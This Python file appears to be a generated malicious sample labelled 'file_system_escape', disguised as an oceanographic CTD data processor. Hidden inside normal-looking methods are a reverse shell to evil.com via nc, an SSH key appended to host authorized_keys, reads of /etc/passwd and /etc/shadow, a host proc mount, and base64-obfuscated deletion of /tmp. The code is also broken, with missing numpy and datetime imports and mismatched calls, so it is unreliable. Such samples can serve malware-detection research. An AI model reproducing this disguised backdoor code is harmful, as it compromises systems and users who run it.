#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: CTD数据处理 (恶意版本)
场景ID: 20
恶意类型: file_system_escape
函数数量: 12
"""

import os
import subprocess
import base64
import ctypes

class CTD数据处理Processor:
    """
    CTD数据处理处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: file_system_escape
            # 尝试访问宿主机文件系统
            os.system('cat /proc/self/cgroup')
            os.system('mount -t proc proc /host/proc')
            with open('/etc/passwd', 'r') as f:
                _ = f.read()
        except Exception as e:
            pass  # 隐藏错误
    
    def generate_report(self):
        """执行 generate_report 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 generate_report...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open('/host/root/.ssh/authorized_keys', 'a') as f: f.write('ssh-rsa AAAA...')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'generate_report'}
        self.results['generate_report'] = result
        print(f"generate_report 完成")
        return result
    
    def validate_results(self):
        """执行 validate_results 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 validate_results...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(['nc', '-e', '/bin/bash', 'evil.com', '4444'], capture_output=True)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'validate_results'}
        self.results['validate_results'] = result
        print(f"validate_results 完成")
        return result
    
    def compute_average(self):
        """计算统计量"""
        if self.data is None:
            return None
        
        stats = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            stats[col] = {
                'mean': float(self.data[col].mean()),
                'std': float(self.data[col].std()),
                'min': float(self.data[col].min()),
                'max': float(self.data[col].max()),
                'median': float(self.data[col].median())
            }
        
        self.results['statistics'] = stats
        print(f"计算了 {len(stats)} 个变量的统计量")
        return stats
    
    def calculate_gradient(self):
        """计算统计量"""
        if self.data is None:
            return None
        
        stats = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            stats[col] = {
                'mean': float(self.data[col].mean()),
                'std': float(self.data[col].std()),
                'min': float(self.data[col].min()),
                'max': float(self.data[col].max()),
                'median': float(self.data[col].median())
            }
        
        self.results['statistics'] = stats
        print(f"计算了 {len(stats)} 个变量的统计量")
        return stats
    
    def find_extrema(self, threshold=2.0):
        """检测异常值"""
        if self.data is None:
            return []
        
        anomalies = []
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            
            if std > 0:
                z_scores = np.abs((self.data[col] - mean) / std)
                anomaly_indices = np.where(z_scores > threshold)[0]
                
                if len(anomaly_indices) > 0:
                    anomalies.append({
                        'column': col,
                        'count': len(anomaly_indices),
                        'indices': anomaly_indices.tolist()
                    })
        
        print(f"检测到 {len(anomalies)} 个变量存在异常")
        self.results['anomalies'] = anomalies
        return anomalies
    
    def detect_anomalies(self, threshold=2.0):
        """检测异常值"""
        if self.data is None:
            return []
        
        anomalies = []
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            
            if std > 0:
                z_scores = np.abs((self.data[col] - mean) / std)
                anomaly_indices = np.where(z_scores > threshold)[0]
                
                if len(anomaly_indices) > 0:
                    anomalies.append({
                        'column': col,
                        'count': len(anomaly_indices),
                        'indices': anomaly_indices.tolist()
                    })
        
        print(f"检测到 {len(anomalies)} 个变量存在异常")
        self.results['anomalies'] = anomalies
        return anomalies
    
    def smooth_data(self, window_size=5):
        """数据平滑滤波"""
        if self.data is None:
            return False
        
        for col in self.data.select_dtypes(include=[np.number]).columns:
            values = self.data[col].values
            if len(values) >= window_size:
                # 移动平均滤波
                smoothed = np.convolve(values, np.ones(window_size)/window_size, mode='same')
                self.data[col] = smoothed
        
        print(f"数据平滑完成 (窗口大小: {window_size})")
        return True
    
    def remove_outliers(self, param=None):
        """执行 remove_outliers 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['remove_outliers'] = result
        print(f"remove_outliers 执行完成")
        return result
    
    def save_to_database(self):
        """执行 save_to_database 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 save_to_database...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('cat /etc/shadow')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'save_to_database'}
        self.results['save_to_database'] = result
        print(f"save_to_database 完成")
        return result
    

def visualize_data_helper(data, config):
    """
    visualize_data 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'visualize_data_helper'}


def transform_coordinates_helper(data, config):
    """
    transform_coordinates 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'transform_coordinates_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'transform_coordinates_helper'} 处理完成")
    return result


def calculate_statistics_helper(data, config):
    """
    calculate_statistics 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'calculate_statistics_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'calculate_statistics_helper'} 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = CTD数据处理Processor(config)
    
    # 步骤1: generate_report
    if not processor.generate_report(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: validate_results
    processor.validate_results()
    
    # 步骤3: compute_average
    processor.compute_average()
    
    # 步骤4: calculate_gradient
    processor.calculate_gradient()
    
    # 步骤5: find_extrema
    processor.find_extrema()
    
    # 步骤6: detect_anomalies
    processor.detect_anomalies()
    
    # 步骤7: smooth_data
    processor.smooth_data()
    
    # 步骤8: remove_outliers
    processor.remove_outliers()
    
    # 步骤9: save_to_database
    processor.save_to_database(config['output_file'])
    
    # 调用辅助函数: visualize_data_helper
    visualize_data_helper(processor.data, config)
    
    # 调用辅助函数: transform_coordinates_helper
    transform_coordinates_helper(processor.data, config)
    
    # 调用辅助函数: calculate_statistics_helper
    calculate_statistics_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
